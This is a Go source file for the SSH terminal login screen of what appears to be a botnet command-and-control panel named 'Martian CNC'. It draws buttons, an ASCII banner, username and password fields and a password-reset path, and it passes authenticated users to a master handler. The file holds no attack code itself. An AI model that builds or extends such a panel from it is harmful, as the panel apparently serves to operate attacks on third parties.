package views

import (
	"Martian/src/functions"
	"Martian/src/database"
	"Martian/src/master"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"

	"GoEYE"
)

// Welcomes the new founded connection onto Martian CNC
func NewLoginConnection(channel ssh.Channel, connection *ssh.ServerConn) error {

	// Adjusts the terminals connection window size
	if _, err := channel.Write([]byte("\033c" + "\033[8;30;80t")); err != nil {
		return err
	}

	// Allocated 50 ms for window resizing
	time.Sleep(50 * time.Millisecond)

	// Allocated a channel for closing goroutines
	cancel := make(chan struct{})

	// Runs the marquee for the marquee system at the bottom of the screen
	go functions.MarqueeText(channel, "\x1b[0m│", "Welcome to martian, FBs latest Zee an Zee", 29, 1, 78, 70, "\x1b[0m│", cancel)

	eye := GoEYE.GoEYE(channel, channel, GoEYE.DefaultStyle) // Creates our terminal style
	eye.MakeButton(true,  26, 3,  26, "HOME",    		"\x1b[48;5;10m\x1b[38;5;16m",  	"\x1b[0m", GoEYE.DefaultStyle) // Login button
	eye.MakeButton(true,  26, 29, 52, "REGISTER", 	    "\x1b[48;5;11m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Register button
	eye.MakeButton(true,  26, 55, 78, "EXIT",     		"\x1b[48;5;9m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Exit button
	eye.MakeButton(true,  23, 29, 52, "SUBMIT",    "\x1b[48;5;11m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Exit button
	eye.MakeButton(false, 1,  3,  11, "Martian",		"", 	 		  	            "",    	   GoEYE.DefaultStyle)


	eye.MakeButton(true,  15, 20, 61, "type username here", "", "", GoEYE.DefaultStyle)	// Username box
	eye.MakeButton(true,  18, 20, 61, "type password here", "", "", GoEYE.DefaultStyle) // Password box
	eye.MakeButton(true,  18, 63, 65, "x", 				    "", "", GoEYE.DefaultStyle)	// Show password
	eye.MakeButton(false, 20, 23, 59, "password_reset", 	"", "", GoEYE.DefaultStyle)	// Password reset

	// Makes the box with the position
	if err := eye.Init(80, 80); err != nil {
		return err
	}

	channel.Write([]byte("\033[4;20f                       _   _             "))				// Little login banner
	channel.Write([]byte("\033[5;20f                      | | (_)            "))				// Little login banner
	channel.Write([]byte("\033[6;20f  _ __ ___   __ _ _ __| |_ _  __ _ _ __  "))				// Little login banner
	channel.Write([]byte("\033[7;20f | '_ ` _ \\ / _` | '__| __| |/ _` | '_ \\ "))				// Little login banner
	channel.Write([]byte("\033[8;20f | | | | | | (_| | |  | |_| | (_| | | | |"))				// Little login banner
	channel.Write([]byte("\033[9;20f |_| |_| |_|\\__,_|_|   \\__|_|\\__,_|_| |_|"))				// Little login banner
	channel.Write([]byte("\033[10;20f    \x1b[4mplease login to your account below\x1b[0m"))	// Little login banner
	channel.Write([]byte("\033[20;20f    Forgotten your password? click here"))

	// Writes the marquee system for the element
	channel.Write([]byte("\033[28;0f├"+ strings.Repeat("─", 78)+"┤"))
	channel.Write([]byte("\033[0;3f \x1b[4mMartian\x1b[0m "))

	// Channel for feteching the information
	str := make(chan *GoEYE.Event)


	// Stop the cursor temp 
	var cursor chan struct{} = make(chan struct{})

	// Runs the mouse cursor event
	go eye.WaitEvent(str, cursor) 

	var ( // Stores needed information throughout the system
		Username string = "" // Stroes the username
		Password string = "" // Stores the password

		ShowingPass bool = false // Stores if we are showing the password
	)

	for {
		button := <-str // Fetchs the method from the homePage

		// Only allows for valid cursor clicking on the home page buttons
		if button.Type != GoEYE.LeftClick && button.Type != GoEYE.RightClick {
			continue
		}


		// Controls our different routes for each button
		switch button.ButtonOccured.Label {

		case "password_reset": // Password reset
			cursor <- struct{}{}

			// Tries to fetch the user fromt the database
			usr, err := database.System.FetchUser(Username)
			if err != nil || usr == nil {
				Username = "" // Resets the username input
				channel.Write([]byte("\033[15;32f\x1b[48;5;9m\x1b[38;5;16m Unknown username \x1b[0m")); continue
			}


			 // Password reset will reset the pass
			if err := NewPasswordReset(channel, connection, usr); err != nil {
				cancel <- struct{}{}
				return err
			}

			cancel <- struct{}{} // Cancels the marquee channel

			// Renders the login menu connection screen
			return NewLoginConnection(channel, connection)
		case "SUBMIT": // Submits and trys to login

			// Tries to fetch the user fromt the database
			usr, err := database.System.FetchUser(Username)
			if err != nil || usr == nil {
				Username = "" // Resets the username input
				channel.Write([]byte("\033[15;32f\x1b[48;5;9m\x1b[38;5;16m Unknown username \x1b[0m")); continue
			}

			// Hashes the password and hash the system
			if usr.Password != database.Hash(Password) {
				Password = "" // Resets the username input
				channel.Write([]byte("\033[18;32f\x1b[48;5;9m\x1b[38;5;16m Unknown password \x1b[0m")); continue
			}

			cancel <- struct{}{} // Disables marquee
			cursor <- struct{}{} // Disables cursor
			return master.NewMasterHandler(channel, connection, usr) // New master connection handler

		case "HOME", "Martian":
			cancel <- struct{}{}
			cursor <- struct{}{}
			return NewWelcomedConnection(channel, connection) // Home page

		case "EXIT": // exit button
			cancel <- struct{}{}
			cursor <- struct{}{}
			return channel.Close() // Close channel

		case "REGISTER":
			cancel <- struct{}{}
			cursor <- struct{}{}
			return NewRegisterConnection(channel, connection)

		case "type username here": // Username box clicked
			cursor <- struct{}{} // Stops cursor callback

			// Reads the username from the channel and ensures its done
			User, err := functions.ReadFromChannel(channel, 40, false, 15, 21, Username)
			if err != nil {
				cancel <- struct{}{}
				return err
			}
			Username = User // Updates the store

			// Runs the mouse cursor event
			go eye.WaitEvent(str, cursor) 

		case "type password here": // Password box clicked
			cursor <- struct{}{} // Stops cursor callback

			// Reads the password from the channel and ensures its done
			Pass, err := functions.ReadFromChannel(channel, 40, !ShowingPass, 18, 21, Password)
			if err != nil {
				cancel <- struct{}{}
				return err
			}

			Password = Pass // Updates the store

			// Runs the mouse cursor event
			go eye.WaitEvent(str, cursor) 

		case "x": // Showing or hiding the password funciton

			if !ShowingPass {
				button.ButtonOccured.UpdateLabel(" ", "")
				ShowingPass = true

				channel.Write([]byte("\x1b[s\x1b[18;21f"+Password+"\x1b[u"))
			} else {
				button.ButtonOccured.UpdateLabel("x", "")
				ShowingPass = false

				channel.Write([]byte("\x1b[s\x1b[18;21f"+strings.Repeat(functions.MaskCharater, len(Password))+"\x1b[u"))
			}
		}
	}

}